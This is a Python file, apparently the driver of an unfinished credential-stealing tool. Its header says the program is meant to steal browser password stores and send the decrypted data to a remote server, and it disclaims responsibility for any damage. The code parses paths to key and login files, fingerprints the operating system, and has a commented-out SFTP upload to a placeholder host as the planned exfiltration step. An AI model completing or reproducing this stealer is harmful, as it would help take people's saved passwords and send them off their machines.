## This is the driver file for the main program.
## This program is malicious by nature, do not run unless you intend to cause damage or understand what you are doing.
## I am not responsible for any damage or trouble you may get into by running this program.

## The intent of this program is to steal browser password stores and copy the decrypted data to a remote server.

import argparse
import pysftp
import platform
import sys
import os

def grab_ComandLine(): # Function to grab command line arguments.
    parser = argparse.ArgumentParser()
    parser.add_argument('-k', type=str, required=False, help='Key File')
    parser.add_argument('-l', type=str, required=False, help='Logins')
    
    # Creates the variables that will hold the different arguments so this function can return them.
    args = parser.parse_args()
    keyFilePath = args.k
    loginsFilePath = args.l
    # Returns the variables.
    return keyFilePath, loginsFilePath




# Main Function
if __name__ == '__main__':
    # Initilizes the key and logins path from the provided command line arguments.
    keyFilePath, loginsFilePath = grab_ComandLine()
    # Use the platform library to fingerprint the system.
    osType = platform.system()
    print(osType)
    
    # Open a file for logging purposes
    #log = 'log.txt'
    #log = open(log, "w")
    
    # Need to make a switch / branch that looks for the file in the specific folder given the OS.
    # Once these files are found, we can then take their file paths and pass them into our SFTP transfers.
    
    
   # with pysftp.Connection('IP/Hostname', username='username', password='password') as sftp:
   #     sftp.put('File to Copy')
   
   
   
    sys.exit(1)
        